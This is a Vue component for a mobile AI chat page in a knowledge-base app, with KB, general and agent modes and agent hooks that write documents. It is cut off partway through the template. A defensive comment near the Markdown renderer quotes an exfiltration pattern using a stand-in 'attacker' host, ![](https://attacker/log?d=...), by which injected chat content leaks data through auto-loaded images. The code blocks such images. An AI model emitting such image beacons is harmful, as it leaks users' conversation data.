<script setup>
/**
 * 移动端 AI 问答（原生页，替代此前 iframe 嵌桌面 /ai/chat 的做法）
 *
 * 与桌面版共用同一套后端接口（api/ai.js），但布局按手机重做：
 *   - 顶部：返回 / 标题 / 历史会话 / 新建
 *   - 模式切换（知识库 / 通用）+ 模型选择（原生 select，不依赖未注册的 ElSelect）
 *   - 气泡消息流：用户右对齐、AI 左对齐并渲染 Markdown（html:false，AI 返回内容天然防 XSS）
 *   - 底部固定输入条（含 safe-area），生成中可「停止」
 *   - 历史会话用底部抽屉承载，避免挤占小屏正文空间
 */
import { ref, reactive, computed, nextTick, onMounted } from 'vue'
import { useRouter } from 'vue-router'
import { useAuthStore } from '../../store/auth'
import {
  aiAsk, listAiModels, listConversations, createConversation,
  deleteConversation, listMessages, updateConversation
} from '../../api/ai'
import { search } from '../../api/kb'
import { recognizeLocal } from '../../utils/localOcr'
import { compressImage } from '../../utils/imageCompress'
import { parseDocument, DOC_EXTS } from '../../utils/docParse'
import { runLocalAgent } from '../../utils/localAgent'
import { createMyDoc, updateMyDoc, listMyDocs } from '../../api/kb'
import { listMyFiles } from '../../api/file'
import api from '../../api/request'
import { buildFlowchartGraph, flowchartHtml } from '../../utils/flowchartGen'
import { createShareDoc, updateShareDoc, getShareDoc } from '../../api/docShare'
import { resolveDefaultSpaceId } from '../../utils/spaceResolver'
import MarkdownIt from 'markdown-it'

const router = useRouter()
const auth = useAuthStore()

const conversations = ref([])
const currentId = ref(null)
const convMessages = ref({})
const input = ref('')
const loading = ref(false)
const abortCtrl = ref(null)
const bodyRef = ref(null)
const historyOpen = ref(false)

const mode = ref('kb')            // kb | general | agent
const modelList = ref([])
const selectedModelId = ref('')

// ---------- 附件：内容在本地解析（图片走内置 OCR、文本文件直接读），随提问一起发给 AI ----------
const attachments = ref([])       // [{ id, name, size, kind: 'image'|'text', text }]
const fileInput = ref(null)
const ATT_TEXT_MAX = 200 * 1024   // 文本文件上限 200KB
const ATT_SNIPPET = 6000          // 单附件注入提问的内容截断长度
const attBusy = ref(false)

// ---------- Agent 模式：直连自建 Hermes Agent 的 OpenAI 兼容端点 ----------
// Hermes 部署在用户自己的机器/服务器上（hermes gateway + API_SERVER_ENABLED=true），
// 端点形如 http://<ip>:8642/v1。端点与 Key 只存本机 localStorage，不入仓库。
const agentSteps = ref([])       // Agent 步骤列表（累积展示，用户能看到它做了哪些事）
const agentStepsOpen = ref(true) // 步骤折叠状态：执行中展开，完成后自动收起
const agentOpen = ref(false)      // Agent 设置弹层
const agentEngine = ref(localStorage.getItem('kb_agent_engine') || 'local')   // local | hermes
const agentEndpoint = ref(localStorage.getItem('kb_agent_endpoint') || '')
const agentKey = ref(localStorage.getItem('kb_agent_key') || '')

function saveAgentCfg() {
  const eng = agentEngine.value
  const ep = agentEndpoint.value.trim().replace(/\/+$/, '')
  // 本地引擎不需要端点（用平台已配的 AI 模型）；只有 Hermes 引擎才校验端点
  if (eng === 'hermes' && !ep) {
    window.__kbMsg?.warning('Hermes 引擎需填写端点（如 http://192.168.1.10:8642/v1）')
    return
  }
  try {
    localStorage.setItem('kb_agent_engine', eng)
    localStorage.setItem('kb_agent_endpoint', ep)
    localStorage.setItem('kb_agent_key', agentKey.value.trim())
  } catch {}
  agentOpen.value = false
  window.__kbMsg?.success('Agent 配置已保存')
}

function openAgentCfg() {
  agentEngine.value = localStorage.getItem('kb_agent_engine') || 'local'
  agentEndpoint.value = localStorage.getItem('kb_agent_endpoint') || ''
  agentKey.value = localStorage.getItem('kb_agent_key') || ''
  agentOpen.value = true
}

const messages = computed(() => (currentId.value ? (convMessages.value[currentId.value] || []) : []))
const userName = computed(() => auth.user?.displayName || auth.user?.username || '我')
const userInitial = computed(() => (userName.value || '我').charAt(0).toUpperCase())

// 空状态文案跟随模式：切到「通用」后不能再挂着知识库口吻，否则用户以为模式没生效
const KB_SUGS = ['如何发布一篇文章？', '知识库支持哪些内容格式？', '怎么查看我的积分明细？', '帮我总结一下知识库的常见用法']
const GENERAL_SUGS = ['用三句话解释什么是向量数据库', '帮我把这段话润色得更正式', '推荐几本讲系统设计的好书', '写一个 Python 读取 Excel 的例子']
const AGENT_SUGS = ['帮我梳理知识库里关于入职流程的全部文档并给出要点', '检索项目资料并写一份周报草稿', '把我的会议记录整理成待办清单']
const sugs = computed(() => (mode.value === 'agent' ? AGENT_SUGS : (mode.value === 'general' ? GENERAL_SUGS : KB_SUGS)))
const agentReady = computed(() => !!localStorage.getItem('kb_agent_endpoint'))

// ---------- Markdown：html:false 会转义源里的裸 HTML，AI 返回内容不会变成 XSS ----------
// 刻意不接 prism 高亮：桌面版那套 prism 语言组件有「全局 Prism 求值顺序」的坑，
// 移动端没必要为代码高亮付出这个复杂度和体积。
const md = new MarkdownIt({ html: false, linkify: true, breaks: true })
// 外部图片不自动加载：markdown 的 ![](https://attacker/log?d=...) 会被浏览器自动请求，
// 被注入的对话内容可能借此外泄（外部复审 2026-10-07）。只放行本站 /uploads /emojis，
// 其余降级为纯文本链接（点击才会访问）。
const LOCAL_IMG_RE = /^\/(uploads|emojis)\//i
const defaultRenderImage = md.renderer.rules.image
md.renderer.rules.image = (tokens, idx, opts, env, self) => {
  const src = tokens[idx].attrGet('src') || ''
  if (LOCAL_IMG_RE.test(src) || /^(data:image\/(png|jpe?g|gif|webp|bmp);base64,)/i.test(src)) {
    return defaultRenderImage(tokens, idx, opts, env, self)
  }
  const href = md.utils.escapeHtml(src)
  return '<a href="' + href + '" target="_blank" rel="noopener noreferrer">[外部图片，点击查看]</a>'
}

function renderMarkdown(src) {
  try {
    return md.render(String(src || ''))
  } catch {
    return String(src || '').replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]))
  }
}

function fmtMs(ms) {
  if (!ms) return ''
  return ms >= 1000 ? (ms / 1000).toFixed(2) + 's' : ms + 'ms'
}
function buildMeta(data) {
  if (!data) return null
  const name = data.modelName || data.model || ''
  if (!name && data.latencyMs == null) return null
  return { name, latencyMs: Number(data.latencyMs) || 0, usage: data.usage || null }
}

function scrollToBottom() {
  nextTick(() => { if (bodyRef.value) bodyRef.value.scrollTop = bodyRef.value.scrollHeight })
}

async function loadModels() {
  try {
    const { data } = await listAiModels()
    modelList.value = data || []
    if (selectedModelId.value && !modelList.value.some((m) => String(m.id) === String(selectedModelId.value))) {
      selectedModelId.value = ''
    }
  } catch { modelList.value = [] }
}

async function loadConversations() {
  try {
    const { data } = await listConversations()
    conversations.value = data || []
  } catch { conversations.value = [] }
}

async function loadMessages(id) {
  if (!id || convMessages.value[id]) return
  try {
    const { data } = await listMessages(id)
    convMessages.value[id] = (data || []).map((m) => ({
      role: m.role, content: m.content, sources: m.sources || [], mode: m.mode || 'kb'
    }))
  } catch { convMessages.value[id] = [] }
}

async function selectConversation(id) {
  historyOpen.value = false
  if (currentId.value === id) return
  currentId.value = id
  try { localStorage.setItem('kb_ai_current_conversation', String(id)) } catch {}
  await loadMessages(id)
  scrollToBottom()
}

async function newConversation() {
  historyOpen.value = false
  try {
    const { data } = await createConversation('新对话')
    convMessages.value[data.id] = []
    conversations.value.unshift(data)
    currentId.value = data.id
    try { localStorage.setItem('kb_ai_current_conversation', String(data.id)) } catch {}
    input.value = ''
  } catch {
    window.__kbMsg?.error('创建会话失败')
  }
}

async function removeConversation(id) {
  try {
    await deleteConversation(id)
    conversations.value = conversations.value.filter((c) => c.id !== id)
    delete convMessages.value[id]
    if (currentId.value === id) currentId.value = null
    window.__kbMsg?.success('已删除')
  } catch { window.__kbMsg?.error('删除失败') }
}

function stopAi() { abortCtrl.value?.abort() }

// 高消耗发送确认的开关与阈值（管理员在「AI 模型管理 → 消息设置」配置）
const aiGuard = reactive({ enabled: true, imageThreshold: 2, textThreshold: 8000 })
async function loadAiGuard() {
  try {
    const { data } = await api.get('/public/ai-guard')
    if (data && typeof data.enabled === 'boolean') aiGuard.enabled = data.enabled
    if (data && Number(data.imageThreshold) > 0) aiGuard.imageThreshold = Number(data.imageThreshold)
    if (data && Number(data.textThreshold) > 0) aiGuard.textThreshold = Number(data.textThreshold)
  } catch { /* 读不到就用默认 */ }
}

// ---- Agent 询问用户（ask_user 工具）：Agent 拿不准时弹出来让用户拍板 ----
const agentAsk = ref(null)      // { question, options, resolve }
const agentAskInput = ref('')
function askUser(question, options) {
  return new Promise((resolve) => {
    agentAskInput.value = ''
    agentAsk.value = { question, options: options || [], resolve }
  })
}
function answerAgentAsk(val) {
  const a = agentAsk.value
  if (!a) return
  const ans = String(val != null ? val : agentAskInput.value || '').trim()
  agentAsk.value = null
  agentAskInput.value = ''
  a.resolve(ans)
}

/**
 * 轻量 Markdown → HTML：Agent 写/改文档时用（文档正文存的是富文本 HTML）。
 * 只支持标题 / 列表 / 加粗 / 代码块 / 段落 —— 够 Agent 产出用，且零依赖。
 */
function mdToHtml(md) {
  const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')   // 引号必须转义：alt/src 属性位置可被注入 onerror
  const out = []
  let inCode = false
  let inList = false
  const closeList = () => { if (inList) { out.push('</ul>'); inList = false } }
  for (const raw of String(md || '').split('\n')) {
    const line = raw.replace(/\s+$/, '')
    if (/^```/.test(line)) {
      closeList()
      out.push(inCode ? '</pre>' : '<pre>')
      inCode = !inCode
      continue
    }
    if (inCode) { out.push(esc(line)); continue }
    // 图片：![说明](url) —— Agent 用 list_my_files 拿到 url 后这样插入
    const img = line.match(/^!\[([^\]]*)\]\(([^)\s]+)\)\s*$/)
    if (img) { closeList(); out.push(`<img src="${esc(img[2])}" alt="${esc(img[1])}"/>`); continue }
    // 视频 / 音频：@[video](url) / @[audio](url)（HTML 标签会被转义，故用专门语法）
    const media = line.match(/^@\[(video|audio)\]\(([^)\s]+)\)\s*$/)
    if (media) {
      closeList()
      out.push(`<${media[1]} src="${esc(media[2])}" controls></${media[1]}>`)
      continue
    }
    const h = line.match(/^(#{1,4})\s+(.*)$/)
    if (h) { closeList(); out.push(`<h${h[1].length}>${esc(h[2])}</h${h[1].length}>`); continue }
    const li = line.match(/^\s*[-*]\s+(.*)$/)
    if (li) { if (!inList) { out.push('<ul>'); inList = true } out.push(`<li>${esc(li[1])}</li>`); continue }
    closeList()
    if (!line.trim()) continue
    out.push(`<p>${esc(line).replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')}</p>`)
  }
  closeList()
  if (inCode) out.push('</pre>')
  return out.join('')
}

// ---------- 附件 ----------
function pickFiles() { fileInput.value?.click() }

function removeAttachment(id) {
  attachments.value = attachments.value.filter((a) => a.id !== id)
}

/** 图片附件切换处理方式：看图（多模态）⇄ 识文字（本地 OCR，离线可用） */
function toggleAttMode(id) {
  const a = attachments.value.find((x) => x.id === id)
  if (a && a.kind === 'image') a.mode = a.mode === 'vision' ? 'ocr' : 'vision'
}

/** 「识文字」模式的图片：本地 OCR 填充 text（文字随提问走，离线可用） */
async function ocrMarkedAttachments() {
  for (const a of attachments.value) {
    if (a.kind !== 'image' || a.mode !== 'ocr' || a.text) continue
    try {
      window.__kbMsg?.info('正在本地识别「' + a.name + '」…')
      const r = await recognizeLocal(a.file || a.dataUrl, () => {}, { table: true })
      a.text = (r && r.text ? String(r.text) : '').trim()
      if (!a.text) window.__kbMsg?.warning('「' + a.name + '」没有识别出文字，已跳过')
    } catch (err) {
      window.__kbMsg?.warning('「' + a.name + '」本地识别失败：' + ((err && err.message) || err))
    }
  }
}

async function onFilesPicked(e) {
  const list = Array.from(e.target.files || [])
  e.target.value = ''
  if (!list.length) return
  if (attBusy.value) return
  attBusy.value = true
  for (const f of list) {
    if (attachments.value.length >= 4) { window.__kbMsg?.warning('一次最多带 4 个附件'); break }
    const isDoc = DOC_EXTS.test(f.name)
    const sizeLimit = isDoc ? 20 * 1024 * 1024 : 8 * 1024 * 1024
    if (f.size > sizeLimit) { window.__kbMsg?.warning('「' + f.name + '」超过 ' + (isDoc ? 20 : 8) + 'MB，已跳过'); continue }
    try {
      let text = ''
      let kind = 'text'
      if (/^image\//i.test(f.type)) {
        // 图片：默认「看图」——压缩后多模态直接交给模型（图案/排版都能识别）；
        // chip 上可切「识文字」用本地 tesseract OCR（离线可用）；拍照建文档的离线识别不受影响
        const dataUrl = await compressImage(f)
        attachments.value = [...attachments.value, {
          id: Date.now() + '-' + Math.random().toString(36).slice(2, 7),
          name: f.name, size: f.size, kind: 'image', dataUrl, text: '', file: f, mode: 'vision'
        }]
        continue
      } else if (isDoc) {
        // PDF / Word / PPT / Excel：本地解析成文本（PDF 扫描件页自动转图走多模态）
        window.__kbMsg?.info('正在解析「' + f.name + '」…')
        const r = await parseDocument(f)
        const txt = (r && r.text ? r.text : '').trim()
        if (txt) {
          attachments.value = [...attachments.value, {
            id: Date.now() + '-' + Math.random().toString(36).slice(2, 7),
            name: f.name, size: f.size, kind: 'text',
            text: txt.slice(0, ATT_SNIPPET) + (txt.length > ATT_SNIPPET ? '\n…（内容过长已截断）' : '')
          }]
        }
        const imgs = (r && r.images) || []
        for (let i = 0; i < Math.min(imgs.length, 2); i++) {
          if (attachments.value.length >= 4) break
          attachments.value = [...attachments.value, {
            id: Date.now() + '-p' + i + '-' + Math.random().toString(36).slice(2, 7),
            name: f.name + ' 第' + (i + 1) + '页', size: 0, kind: 'image', dataUrl: imgs[i], text: '', mode: 'vision'
          }]
        }
        if (!txt && !imgs.length) window.__kbMsg?.warning('「' + f.name + '」没解析出内容')
        continue
      } else if (/\.(txt|md|markdown|json|csv|log|xml|yml|yaml|sql|ts|js|mjs|py|java|html?|css|vue|ini|conf|properties)$/i.test(f.name) || /^text\//i.test(f.type || '')) {
        if (f.size > ATT_TEXT_MAX) { window.__kbMsg?.warning('「' + f.name + '」超过 200KB，已跳过'); continue }
        kind = 'text'
        text = await new Promise((res, rej) => {
          const r = new FileReader()
          r.onload = () => res(String(r.result || ''))
          r.onerror = () => rej(new Error('读取失败'))
          r.readAsText(f, 'utf-8')
        })
      } else {
        window.__kbMsg?.warning('「' + f.name + '」暂不支持（支持图片、PDF、Word/PPT/Excel、文本类文件）')
        continue
      }
      const safeName = f.name.replace(/[\r\n\u0000-\u001f]/g, ' ')
      attachments.value = [...attachments.value, {
        id: Date.now() + '-' + Math.random().toString(36).slice(2, 7),
        name: safeName, size: f.size, kind,
        text: text.slice(0, ATT_SNIPPET) + (text.length > ATT_SNIPPET ? '\n…（内容过长已截断）' : '')
      }]
    } catch (err) {
      window.__kbMsg?.error('解析「' + f.name + '」失败：' + ((err && err.message) || err))
    }
  }
  attBusy.value = false
}

/** 把文本类内容（文本文件 + 已本地识别的图片）拼进提问；「看图」的图片由 images 走多模态 */
function buildQuestionWithAttachments(q) {
  const texts = attachments.value.filter((a) => a.text)
  if (!texts.length) return q
  const parts = texts.map((a, i) =>
    '【附件 ' + (i + 1) + '：' + a.name + (a.kind === 'image' ? ' · 本地识别文字】' : '】') + '\n' + a.text
  )
  return parts.join('\n\n') + '\n\n【提问】' + q
}
/** 发送前把附件文字汇总为一段（Agent 两种引擎共用） */
const attachmentsText = computed(() => {
  const texts = attachments.value.filter((a) => a.text)
  if (!texts.length) return ''
  return texts.map((a, i) =>
    '【附件 ' + (i + 1) + '：' + a.name + (a.kind === 'image' ? ' · 本地识别文字】' : '】') + '\n' + a.text
  ).join('\n\n')
})

/** Hermes 直连：OpenAI 兼容 /chat/completions（非流式，带最近历史） */
async function callHermes(q, hist, signal) {
  const ep = (localStorage.getItem('kb_agent_endpoint') || '').trim()
  if (!ep) { openAgentCfg(); throw new Error('未配置 Hermes 端点') }
  const key = localStorage.getItem('kb_agent_key') || ''
  const messages = [
    { role: 'system', content: '你是企业知识库移动端里的 Agent 助手。用简体中文回答；需要外部信息时使用你的工具；回答尽量给出可执行的结论。' },
    ...hist,
    { role: 'user', content: q }
  ]
  const resp = await fetch(ep.replace(/\/+$/, '') + '/chat/completions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...(key ? { Authorization: 'Bearer ' + key } : {}) },
    body: JSON.stringify({ model: 'hermes-agent', messages, stream: false }),
    signal
  })
  if (!resp.ok) throw new Error('Hermes 端点返回 ' + resp.status)
  const data = await resp.json()
  return data.choices?.[0]?.message?.content || '（Agent 未返回内容）'
}

// ---------- Agent 模式：直连 Hermes 的 OpenAI 兼容端点（带最近历史，无状态调用） ----------
async function sendAgent(convId) {
  const ep = (localStorage.getItem('kb_agent_endpoint') || '').trim()
  if (!ep) { openAgentCfg(); return }
  const key = localStorage.getItem('kb_agent_key') || ''
  const q = buildQuestionWithAttachments(input.value.trim())
  const fileNames = attachments.value.map((a) => a.name)

  const cur = convMessages.value[convId] || []
  convMessages.value[convId] = [...cur, {
    role: 'user', content: input.value.trim(), files: fileNames.length ? fileNames : null
  }]
  input.value = ''
  attachments.value = []
  loading.value = true
  await nextTick()
  scrollToBottom()

  try {
    // 历史取最近 10 条（Hermes 无状态，全量由 messages 传入；带附件内容的历史消息同样注入）
    const hist = cur.slice(-10).map((m) => ({
      role: m.role === 'ai' ? 'assistant' : 'user',
      content: (m.role === 'user' && m.files && m.files.length)
        ? '[附件：' + m.files.join('、') + '] ' + m.content
        : m.content
    }))
    hist.push({ role: 'user', content: q })
    abortCtrl.value = new AbortController()
    const resp = await fetch(ep.replace(/\/+$/, '') + '/chat/completions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(key ? { Authorization: 'Bearer ' + key } : {})
      },
      body: JSON.stringify({
        model: 'hermes-agent',
        messages: [
          { role: 'system', content: '你是企业知识库移动端里的 Agent 助手。用简体中文回答；需要外部信息时使用你的工具；回答尽量给出可执行的结论。' },
          ...hist
        ],
        stream: false
      }),
      signal: abortCtrl.value.signal
    })
    if (!resp.ok) throw new Error('Agent 端点返回 ' + resp.status)
    const data = await resp.json()
    const content = data.choices?.[0]?.message?.content || '（Agent 未返回内容）'
    const curAi = convMessages.value[convId] || []
    convMessages.value[convId] = [...curAi, { role: 'ai', content, sources: [], mode: 'agent' }]
  } catch (e) {
    const stopped = e && (e.name === 'CanceledError' || e.code === 'ERR_CANCELED' || e.name === 'AbortError')
    const curErr = convMessages.value[convId] || []
    convMessages.value[convId] = [...curErr, {
      role: 'ai',
      content: stopped ? '（已停止）' : 'Agent 调用失败：' + ((e && e.message) || e) + '\n请检查 Agent 端点是否可达、Key 是否正确。',
      sources: [], mode: 'agent'
    }]
  } finally {
    abortCtrl.value = null
    loading.value = false
    scrollToBottom()
  }
}

async function send(text) {
  const q = (text ?? input.value).trim()
  if (!q && !attachments.value.length) { window.__kbMsg?.warning('请输入内容'); return }
  if (loading.value) return
  if (mode.value === 'agent') {
    // Agent 模式独立链路：本地引擎（ReAct + 本地工具）或直连自建 Hermes 端点。
    // 两者都不进后端会话（历史由前端传递，消息仅存本机内存）。
    if (typeof navigator !== 'undefined' && navigator.onLine === false) {
      window.__kbMsg?.warning('当前离线，无法使用 Agent'); return
    }
    let cid = currentId.value
    if (!cid) {
      const local = 'agent-' + Date.now()
      convMessages.value[local] = []
      conversations.value.unshift({ id: local, title: 'Agent 对话' })
      currentId.value = local
      cid = local
    }
    if (!input.value.trim() && attachments.value.length) input.value = '请帮我处理附件内容'

    const engine = localStorage.getItem('kb_agent_engine') || 'local'
    // Agent 两种引擎都基于文本工作：图片一律先本地 OCR 成文字（离线也能用）
    for (const a of attachments.value) {
      if (a.kind !== 'image' || a.text) continue
      try {
        agentSteps.value = [...agentSteps.value, '本地识别「' + a.name + '」…']
        const r = await recognizeLocal(a.file || a.dataUrl, () => {}, { table: true })
        a.text = (r && r.text ? String(r.text) : '').trim()
      } catch { a.text = '' }
    }
    agentSteps.value = []
    const fileNames = attachments.value.map((a) => a.name)
    const q = input.value.trim() || '请帮我处理附件内容'
    const cur = convMessages.value[cid] || []
    convMessages.value[cid] = [...cur, {
      role: 'user', content: q, files: fileNames.length ? fileNames : null
    }]
    input.value = ''
    attachments.value = []
    loading.value = true
    agentSteps.value = []
    await nextTick()
    scrollToBottom()

    try {
      abortCtrl.value = new AbortController()
      const signal = abortCtrl.value.signal

      // 附件文字随任务带入（两种引擎通用）
      const withAtt = attachmentsText.value
        ? attachmentsText.value + '\n\n【任务】' + q
        : q
      const hist = cur.slice(-6).map((m) => ({
        role: m.role === 'ai' ? 'assistant' : 'user',
        content: (m.role === 'user' && m.files && m.files.length) ? '[附件：' + m.files.join('、') + '] ' + m.content : m.content
      }))

      let answer = ''
      let steps = []
      if (engine === 'hermes') {
        agentSteps.value = [...agentSteps.value, '调用 Hermes…']
        const r = await callHermes(withAtt, hist, signal)
        answer = r
      } else {
        agentSteps.value = [...agentSteps.value, '启动本地 Agent…']
        const r = await runLocalAgent({
          question: withAtt,
          ask: async (text, sig) => {
            const { data } = await aiAsk(text, null, 'general', {
              modelId: selectedModelId.value || null, signal: sig || signal
            })
            return data.answer || ''
          },
          onStep: (t) => { agentSteps.value = [...agentSteps.value, t] },
          signal,
          // 让 Agent 真正能「干活」：跳转页面 + 写/改知识库文档
          hooks: {
            askUser,
            listMyFiles: async () => {
              try {
                const { data } = await listMyFiles()
                const rows = (data || []).slice(0, 40).map((f) => {
                  const kind = /^image/i.test(f.contentType || '') ? '图片'
                    : /^(audio|video)/i.test(f.contentType || '') ? '音视频' : '文件'
                  return `- [${kind}] ${f.name} → ${f.url}`
                })
                return rows.length ? `我的文件共 ${rows.length} 个：\n` + rows.join('\n') : '我还没有上传文件'
              } catch (e) {
                return '列出文件失败：' + ((e && e.message) || e)
              }
            },
            navigate: async (path) => {
              if (!path || !String(path).startsWith('/')) return '跳转失败：路径不合法（需以 / 开头）'
              try {
                router.push(String(path))
                return '已跳转到 ' + path
              } catch (e) {
                return '跳转失败：' + ((e && e.message) || e)
              }
            },
            listMyDocs: async () => {
              try {
                const { data } = await listMyDocs()
                const rows = (data || []).slice(0, 30).map((d) => `- [${d.id}] ${d.title || '无标题'}`)
                return rows.length ? `我的文档共 ${rows.length} 篇：\n` + rows.join('\n') : '我还没有自己的文档'
              } catch (e) {
                return '列出文档失败：' + ((e && e.message) || e)
              }
            },
            insertFlowchart: async ({ title, docId, nodes, edges }) => {
              if (auth.isDemo) return '演示账号是只读的，无法生成文档'
              try {
                const graph = buildFlowchartGraph(nodes, edges)
                if (!graph.nodes.length) return '没有有效节点，未生成流程图'
                const html = flowchartHtml(title, graph)
                const sid = await resolveDefaultSpaceId()
                if (!sid) return '没有可写入的共享空间'
                const tip = `（${graph.nodes.length} 个节点 / ${graph.edges.length} 条连线）`
                // docId 来自模型输出：必须是整数，防路径拼接出非预期端点（外部复审 2026-10-08）
                const docIdNum = Number(docId)
                if (docId && !Number.isInteger(docIdNum)) return '文档 id 非法'
                const t = String(title || '流程图').slice(0, 80)
                if (docId) {
                  const { data } = await getShareDoc(sid, docId)
                  await updateShareDoc(sid, docId, { content: String(data.content || '') + html })
                  return `已在共享文档《${data.title || docId}》中生成流程图${tip}`
                }
                const { data } = await createShareDoc(sid, { title: t, content: html })
                return `已新建共享文档《${t}》并生成流程图${tip}（id=${data && data.id}）`
              } catch (e) {
                return '生成流程图失败：' + ((e && e.message) || e)
              }
            },
            createDoc: async ({ title, content, status }) => {
              // 演示账号后端会 403，提前给出明确原因，免得 Agent 白跑几步再失败
              if (auth.isDemo) return '演示账号是只读的，无法创建文档（请用正式账号登录后再试）'
              try {
                const isDraft = status === 'draft'
                const { data } = await createMyDoc({
                  title,
                  content: mdToHtml(content),
                  status: isDraft ? 'DRAFT' : 'PENDING_REVIEW'
                })
                const id = data && data.id
                const st = (data && data.status) || (isDraft ? 'DRAFT' : 'PENDING_REVIEW')
                // 如实回报状态：普通用户不会直接发布，别让用户以为已经公开
                if (st === 'PUBLISHED') return '已发布《' + title + '》（id=' + id + '）'
                if (st === 'DRAFT') return '已存为草稿《' + title + '》（id=' + id + '，仅自己可见，可在草稿箱提交审核）'
                return '已提交审核《' + title + '》（id=' + id + '，等待管理员通过后才公开）'
              } catch (e) {
                return '新建失败：' + ((e && e.message) || e)
              }
            },
            updateDoc: async ({ id, title, content }) => {
              if (auth.isDemo) return '演示账号是只读的，无法修改文档（请用正式账号登录后再试）'
              try {
                const body = { content: mdToHtml(content) }
                if (title) body.title = title
                const { data } = await updateMyDoc(id, body)
                const st = data && data.status
                const extra = st === 'PENDING_REVIEW' ? '（改动已提交审核）' : ''
                return '已更新文档《' + ((data && data.title) || title || id) + '》（id=' + id + '）' + extra
              } catch (e) {
                return '更新失败：' + ((e && e.message) || e)
              }
            }
          }
        })
        answer = r.answer
        steps = r.steps
      }
      const curAi = convMessages.value[cid] || []
      convMessages.value[cid] = [...curAi, { role: 'ai', content: answer, sources: [], mode: 'agent', steps }]
    } catch (e) {
      const stopped = e && (e.name === 'CanceledError' || e.code === 'ERR_CANCELED' || e.name === 'AbortError')
      const curErr = convMessages.value[cid] || []
      convMessages.value[cid] = [...curErr, {
        role: 'ai',
        content: stopped ? '（已停止）' : 'Agent 执行失败：' + ((e && e.message) || e),
        sources: [], mode: 'agent'
      }]
    } finally {
      abortCtrl.value = null
      loading.value = false
      agentStepsOpen.value = false   // 完成后自动收起（数据保留，可点「展开」回看）
      scrollToBottom()
    }
    return
  }
  if (typeof navigator !== 'undefined' && navigator.onLine === false) {
    window.__kbMsg?.warning('当前离线，无法使用 AI 问答')
    return
  }

  // 高消耗确认：图片约 850 tokens/张、文本约 1.5 tokens/汉字。
  // 开关与阈值由管理员在「AI 模型管理 → 消息设置」配置（/api/public/ai-guard）。
  // 放在「插入消息之前」——用户取消时不该在会话里留下这条消息。
  {
    const imgs = attachments.value.filter((a) => a.kind === 'image' && a.mode === 'vision' && a.dataUrl).length
    const textLen = attachments.value.reduce((n, a) => n + (a.text ? a.text.length : 0), 0) + String(q || '').length
    if (aiGuard.enabled && (imgs >= aiGuard.imageThreshold || textLen >= aiGuard.textThreshold)) {
      const est = imgs * 850 + Math.round(textLen * 1.5)
      const ok = window.confirm(
        `本次将发送 ${imgs} 张图片、约 ${textLen} 字文本，预计消耗约 ${est.toLocaleString()} tokens。\n\n继续发送？`
      )
      if (!ok) return
    }
  }

  let convId = currentId.value
  if (!convId) {
    try {
      const { data } = await createConversation(q)
      convMessages.value[data.id] = []
      conversations.value.unshift(data)
      currentId.value = data.id
      convId = data.id
    } catch {
      window.__kbMsg?.error('创建会话失败')
      return
    }
  }

  const fileNames = attachments.value.map((a) => a.name)
  const cur = convMessages.value[convId] || []
  convMessages.value[convId] = [...cur, { role: 'user', content: q, files: fileNames.length ? fileNames : null }]
  const conv = conversations.value.find((c) => c.id === convId)
  if (conv && (conv.title === '新对话' || !conv.title)) {
    const t = q.length > 20 ? q.slice(0, 20) + '…' : q
    conv.title = t
    updateConversation(convId, { title: t }).catch(() => {})
  }

  // 「识文字」模式的图片先本地 OCR（文字拼进提问，离线也能用）；「看图」模式的收集为多模态 images
  await ocrMarkedAttachments()
  const images = attachments.value.filter((a) => a.kind === 'image' && a.mode === 'vision' && a.dataUrl).map((a) => a.dataUrl)
  const finalQ = buildQuestionWithAttachments(q)
  input.value = ''
  attachments.value = []
  loading.value = true
  await nextTick()
  scrollToBottom()

  try {
    abortCtrl.value = new AbortController()
    const { data } = await aiAsk(finalQ, convId, mode.value, {
      modelId: selectedModelId.value || null, signal: abortCtrl.value.signal,
      images: images.length ? images : null
    })
    const curAi = convMessages.value[convId] || []
    convMessages.value[convId] = [...curAi, {
      role: 'ai', content: data.answer || '（暂无返回内容）',
      sources: data.sources || [], mode: mode.value, meta: buildMeta(data)
    }]
    const c2 = conversations.value.find((c) => c.id === convId)
    if (c2 && data.title && data.title !== c2.title) c2.title = data.title
  } catch (e) {
    const stopped = e && (e.name === 'CanceledError' || e.code === 'ERR_CANCELED')
    const curErr = convMessages.value[convId] || []
    convMessages.value[convId] = [...curErr, {
      role: 'ai',
      content: stopped ? '（已停止生成）' : '请求失败，请稍后重试。',
      sources: [], mode: mode.value
    }]
  } finally {
    abortCtrl.value = null
    loading.value = false
    scrollToBottom()
  }
}

onMounted(async () => {
  loadAiGuard()
  await loadModels()
  await loadConversations()
  let saved = null
  try { saved = localStorage.getItem('kb_ai_current_conversation') } catch {}
  if (saved && conversations.value.some((c) => String(c.id) === saved)) {
    await selectConversation(Number(saved))
  }
  scrollToBottom()
})
</script>

<template>
  <div class="aic">
    <header class="aic-head">
      <button class="m-header-act" @click="router.back()"><el-icon :size="20"><ArrowLeft /></el-icon></button>
      <div class="aic-title">AI 问答</div>
      <button class="m-header-act" @click="historyOpen = true"><el-icon :size="20"><Clock /></el-icon></button>
      <button class="m-header-act" @click="newConversation"><el-icon :size="20"><Plus /></el-icon></button>
    </header>

    <div class="aic-bar">
      <div class="aic-seg">
        <button :class="{ on: mode === 'kb' }" @click="mode = 'kb'">知识库</button>
        <button :class="{ on: mode === 'general' }" @click="mode = 'general'">通用</button>
        <button :class="{ on: mode === 'agent' }" @click="mode = 'agent'">Agent</button>
      </div>
      <select v-if="mode !== 'agent'" v-model="selectedModelId" class="aic-model" aria-label="模型">
        <option value="">默认模型</option>
        <option v-for="m in modelList" :key="m.id" :value="String(m.id)">{{ m.name }}</option>
      </select>
      <button v-else class="aic-cfg" aria-label="Agent 设置" @click="openAgentCfg">
        <el-icon :size="16"><Setting /></el-icon>
      </button>
    </div>

    <div ref="bodyRef" class="aic-body">
      <div v-if="!messages.length" class="aic-empty">
        <div class="aic-empty-ico"><el-icon :size="26"><ChatDotRound /></el-icon></div>
        <div class="aic-empty-title">
          {{ mode === 'agent' ? 'Agent 模式' : (mode === 'general' ? '你好，我是通用 AI 助手' : '你好，我是知识库 AI 助手') }}
        </div>
        <div class="aic-empty-tip" v-if="mode === 'agent'">
